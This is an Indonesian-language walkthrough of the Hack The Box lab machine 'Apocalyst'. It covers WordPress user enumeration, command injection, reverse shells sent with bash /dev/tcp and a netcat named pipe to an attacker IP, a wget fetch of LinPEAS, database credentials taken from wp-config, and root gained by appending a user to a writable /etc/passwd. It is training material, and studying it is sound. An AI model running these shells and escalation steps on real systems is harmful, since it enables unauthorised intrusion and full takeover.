
## **Informasi Mesin**

- **Nama**: Apocalyst
    
- **Sistem Operasi**: Linux
    
- **Tingkat Kesulitan**: Medium
    
- **Alamat IP**: 10.10.10.46
## **Tahap Enumerasi**

### **Pemindaian Jaringan**

Hasil pemindaian Nmap mengidentifikasi dua port terbuka:

```bash
PORT    STATE   SERVICE
22/tcp  open    ssh
80/tcp  open    http
```
## **Tahap Eksploitasi Awal**

### **Enumerasi Aplikasi Web**

Pada aplikasi web ditemukan informasi sebagai berikut:

**[+] Identifikasi Pengguna: falaraki**

- **Metode Deteksi**: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    
- **Konfirmasi**: Login Error Messages (Aggressive Detection)
    
### **Kredensial yang Ditemukan**

- **Username**: falaraki
    
- **Password**: Transclisiation
    

## **Eksploitasi Command Injection**

### **Payload Reverse Shell**

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'");
```
### **Penemuan Kredensial Database**

Pada konfigurasi WordPress ditemukan informasi database:

```php
define('DB_NAME', 'wp_myblog');
define('DB_USER', 'root');
define('DB_PASSWORD', 'Th3SoopaD00paPa5S!');
define('DB_HOST', 'localhost');
```
### **Akses Database**

```bash
mysql -u root -pTh3SoopaD00paPa5S!
```

## **Eskalasi Hak Akses**

### **Metode 1: Named Pipe Reverse Shell**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.22 443 >/tmp/f
```
### **Metode 2: Eksploitasi Parameter HTTP**

Menggunakan curl untuk mengeksekusi perintah melalui parameter `greed`:

```bash
curl -s 'http://apocalyst.htb/?p=8' --data-urlencode 'greed=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.22 443 >/tmp/f'
```
### **Verifikasi Eksploitasi**

```bash
curl -s 'http://apocalyst.htb/?p=8&greed=id' | head
```
### **Upgrade Shell**

Python tidak tersedia, namun python3 ada:

```bash
$ python3 -c 'import pty;pty.spawn("bash")'
www-data@apocalyst:/var/www/html/apocalyst.htb$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
stty raw -echo ; fg
sudo nc -lnvp 443
reset
www-data@apocalyst:/var/www/html/apocalyst.htb$
```

### **User Flag**

User www-data dapat mengakses `/home/falaraki` dan membaca user.txt:

```bash
www-data@apocalyst:/home/falaraki$ cat user.txt
9182d4d0**********************
```
## **Eskalasi Hak Akses ke Root**

### **Enumerasi dengan LinPEAS**

Setelah enumerasi manual tidak memberikan hasil yang jelas, diupload LinPEAS:


```bash
www-data@apocalyst:/dev/shm$ wget 10.10.14.14:8000/linpeas.sh
www-data@apocalyst:/dev/shm$ chmod +x linpeas.sh 
www-data@apocalyst:/dev/shm$ ./linpeas.sh
```
### **Temuan Kritis**

LinPEAS mengidentifikasi kerentanan penting:

```bash
[+] Writable passwd file? ................ /etc/passwd is writable
```

Konfirmasi manual:

```bash
www-data@apocalyst:/etc$ ls -l passwd
-rw-rw-rw- 1 root root 1637 Jul 26  2017 passwd
```
### **Membuat User Root**

1. **Generate Password Hash**:
    
```bash
www-data@apocalyst:/etc$ openssl passwd -1 0xdf    
$1$ZdNgkXMh$IACjDuFtgYshwpcoQhQjB/
```

2. **Format Entry User Baru**:
```text
greed:$1$ZdNgkXMh$IACjDuFtgYshwpcoQhQjB/:0:0:greed:/root:/bin/bash
```
3. **Tambahkan ke /etc/passwd**:

```bash
www-data@apocalyst:/etc$ echo 'greed:$1$ZdNgkXMh$IACjDuFtgYshwpcoQhQjB/:0:0:greed:/root:/bin/bash' >> passwd
```
4. **Switch User ke greed**:
```bash
www-data@apocalyst:/etc$ su greed
Password: 
root@apocalyst:/etc#
```
### **Root Flag**

```bash
root@apocalyst:~# cat root.txt
1cb9d00f************************
```
